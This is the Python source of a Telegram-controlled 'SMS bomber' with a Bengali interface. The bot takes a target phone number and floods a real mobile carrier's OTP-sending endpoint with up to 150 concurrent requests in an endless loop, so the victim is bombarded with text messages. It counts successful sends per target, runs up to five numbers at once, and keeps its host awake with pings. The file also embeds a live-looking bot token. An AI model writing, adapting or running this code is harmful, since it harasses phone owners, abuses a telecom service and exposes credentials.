#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
✅ RK-SYSTEM — FastAPI + Telegram SMS Bomber Controller (Stable Release)
Includes:
- Inline + Manual Commands: /start /stop /check /history /refresh
- Memory auto-cleanup + Safe Timeout Handling
- Network Retry on Timeout (10s)
- Auto Wakeup ping (for Render uptime)
- Full Bengali interface + persistent history
"""

import os
import re
import json
import asyncio
import gc
import psutil
from pathlib import Path
from datetime import datetime
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse
import aiohttp
from telegram import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ---------------- CONFIG ----------------
BOT_TOKEN = "7719776924:AAGxCXF0as6sGihPkWrlMqmM6A7T2TKEduo"
API_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
HEADERS = {"Content-Type": "application/json"}
HISTORY_FILE = Path("history.json")
CONCURRENCY = 150
WAKEUP_URL = "https://rkbot0-7.onrender.com/"
MEMORY_LIMIT_MB = 450
MAX_SIMULTANEOUS_NUMBERS_PER_CHAT = 5

# ---------------- HELPERS ----------------
def load_history():
    if HISTORY_FILE.exists():
        try:
            return json.loads(HISTORY_FILE.read_text())
        except Exception:
            return {}
    return {}

def save_history(data):
    HISTORY_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2))

def now_time():
    return datetime.now().strftime("%H:%M:%S %d-%m-%Y")

history = load_history()
running_jobs = {}

# ---------------- FASTAPI APP ----------------
app = FastAPI()

@app.get("/", response_class=HTMLResponse)
async def home():
    return HTMLResponse("<h3>🚀 RK-SYSTEM Bot Running Successfully!</h3>")

@app.get("/health")
async def health():
    return JSONResponse({"status": "ok"})

# ---------------- MEMORY CLEANUP ----------------
async def memory_cleanup():
    process = psutil.Process(os.getpid())
    while True:
        try:
            mem = process.memory_info().rss / 1024 / 1024
            if mem > MEMORY_LIMIT_MB:
                print(f"⚠️ Memory usage high: {mem:.2f} MB — cleaning up...")
                gc.collect()
            await asyncio.sleep(10)
        except Exception as e:
            print(f"[MemoryCleanup Error] {e}")
            await asyncio.sleep(10)

# ---------------- REQUEST SENDER ----------------
class RequestStats:
    def __init__(self):
        self.success = 0
        self.failed = 0
        self.total = 0

async def send_requests(number: str, stop_event: asyncio.Event, stats: RequestStats):
    sem = asyncio.Semaphore(CONCURRENCY)

    while not stop_event.is_set():
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async def fire_once():
                    payload = {"msisdn": number}
                    async with sem:
                        try:
                            async with session.post(API_URL, json=payload, headers=HEADERS) as r:
                                text = await r.text()
                                stats.total += 1
                                if '"status":"SUCCESSFUL"' in text:
                                    stats.success += 1
                                else:
                                    stats.failed += 1
                        except Exception:
                            stats.failed += 1

                tasks = [asyncio.create_task(fire_once()) for _ in range(10)]
                await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)

        except aiohttp.ClientError:
            print("🌐 Network error. Waiting 10s for reconnection...")
            await asyncio.sleep(10)
        except asyncio.TimeoutError:
            print("⏳ Timeout. Retrying after 10s...")
            await asyncio.sleep(10)
        except Exception as e:
            print(f"[Request Error] {e}")
            await asyncio.sleep(5)

# ---------------- TELEGRAM BOT ----------------
def main_menu():
    buttons = [
        [InlineKeyboardButton("🚀 Start", callback_data="start_manual")],
        [InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")],
        [InlineKeyboardButton("📜 History", callback_data="history")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
    ]
    return InlineKeyboardMarkup(buttons)

async def start_cmd(update, context):
    kb = ReplyKeyboardMarkup([[KeyboardButton("এসএমএস বোম্বার")]], resize_keyboard=True)
    await update.message.reply_text("স্বাগতম! নিচের বাটনে চাপুন 👇", reply_markup=kb)

async def message_handler(update, context):
    text = update.message.text.strip()
    chat_id = str(update.effective_chat.id)

    if text == "এসএমএস বোম্বার":
        await update.message.reply_text("টার্গেট নাম্বার দিন (01XXXXXXXXX)", reply_markup=main_menu())
        return

    if re.fullmatch(r"01\d{9}", text):
        ikb = InlineKeyboardMarkup.from_button(InlineKeyboardButton("Start", callback_data=f"start|{text}"))
        await update.message.reply_text(f"নম্বর: {text}\nনিচে Start চাপুন বোম্বিং শুরু করতে 🚀", reply_markup=ikb)
    else:
        await update.message.reply_text("❌ নাম্বার সঠিক নয়! 01XXXXXXXXX ফরম্যাটে দিন।")

async def callback_handler(update, context):
    query = update.callback_query
    await query.answer()
    chat_id = str(query.message.chat.id)
    data = query.data

    if data.startswith("start|"):
        number = data.split("|", 1)[1]

        if chat_id not in running_jobs:
            running_jobs[chat_id] = []
        if len(running_jobs[chat_id]) >= MAX_SIMULTANEOUS_NUMBERS_PER_CHAT:
            await query.message.reply_text("⚠️ একসাথে সর্বাধিক ৫টি নাম্বার চালানো যাবে।")
            return

        stop_event = asyncio.Event()
        stats = RequestStats()
        task = asyncio.create_task(send_requests(number, stop_event, stats))
        running_jobs[chat_id].append({"number": number, "task": task, "stop_event": stop_event, "stats": stats})
        history.setdefault(chat_id, []).append(f"STARTED: {number} at {now_time()}")
        save_history(history)
        await query.message.reply_text(f"✅ বোম্বিং শুরু হয়েছে!\nনম্বর: {number}\n🛑 বন্ধ করতে /stop {number}")
        return

    if data == "history":
        user_hist = history.get(chat_id, [])
        msg = "\n".join(user_hist[-10:]) if user_hist else "No history yet."
        await query.message.reply_text(f"📜 History:\n{msg}", reply_markup=main_menu())
        return

    if data == "stop_all":
        if chat_id in running_jobs and running_jobs[chat_id]:
            for job in running_jobs[chat_id]:
                job["stop_event"].set()
            running_jobs[chat_id] = []
            await query.message.reply_text("🛑 সব বোম্বিং বন্ধ করা হয়েছে।", reply_markup=main_menu())
        else:
            await query.message.reply_text("🚫 কিছুই চলছে না।", reply_markup=main_menu())

    if data == "refresh":
        await query.message.reply_text("🔄 Refresh সফল হয়েছে!", reply_markup=main_menu())

async def stop_cmd(update, context):
    chat_id = str(update.effective_chat.id)
    args = context.args
    if not args:
        await update.message.reply_text("❌ উদাহরণ: /stop 017xxxxxxxx")
        return

    number = args[0]
    if chat_id not in running_jobs:
        await update.message.reply_text("🚫 কোনো কিছু চলছে না।")
        return

    job_index = next((i for i, j in enumerate(running_jobs[chat_id]) if j["number"] == number), None)
    if job_index is None:
        await update.message.reply_text("❌ এই নাম্বারের কোনো রিকোয়েস্ট পাওয়া যায়নি।")
        return

    job = running_jobs[chat_id].pop(job_index)
    job["stop_event"].set()
    s = job["stats"]
    history.setdefault(chat_id, []).append(f"STOPPED: {number} at {now_time()} ✅{s.success}/❌{s.failed}/📊{s.total}")
    save_history(history)
    await update.message.reply_text(f"🛑 বন্ধ করা হয়েছে!\n✅ {s.success} | ❌ {s.failed} | 📊 {s.total}")

async def check_cmd(update, context):
    chat_id = str(update.effective_chat.id)
    if chat_id not in running_jobs or not running_jobs[chat_id]:
        await update.message.reply_text("📭 কিছুই চলছে না।")
        return

    msg = "\n\n".join([f"{j['number']}: ✅{j['stats'].success} ❌{j['stats'].failed} 📊{j['stats'].total}" for j in running_jobs[chat_id]])
    await update.message.reply_text("📡 Running Stats:\n\n" + msg)

async def history_cmd(update, context):
    chat_id = str(update.effective_chat.id)
    user_hist = history.get(chat_id, [])
    msg = "\n".join(user_hist[-10:]) if user_hist else "No history yet."
    await update.message.reply_text(f"📜 History:\n{msg}")

async def telegram_bot():
    app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start_cmd))
    app_bot.add_handler(CommandHandler("stop", stop_cmd))
    app_bot.add_handler(CommandHandler("check", check_cmd))
    app_bot.add_handler(CommandHandler("history", history_cmd))
    app_bot.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), message_handler))
    app_bot.add_handler(CallbackQueryHandler(callback_handler))
    await app_bot.initialize()
    await app_bot.start()
    await app_bot.updater.start_polling()
    print("✅ Telegram bot started.")
    while True:
        await asyncio.sleep(3600)

# ---------------- AUTO WAKEUP ----------------
async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(WAKEUP_URL) as r:
                    print(f"[AutoWakeup] Ping {r.status}")
        except Exception as e:
            print(f"[AutoWakeup Error] {e}")
        await asyncio.sleep(600)

# ---------------- FASTAPI STARTUP ----------------
@app.on_event("startup")
async def startup():
    asyncio.create_task(telegram_bot())
    asyncio.create_task(keep_alive())
    asyncio.create_task(memory_cleanup())
    print("🚀 RK-SYSTEM server started successfully!")

# ---------------- LOCAL RUN ----------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
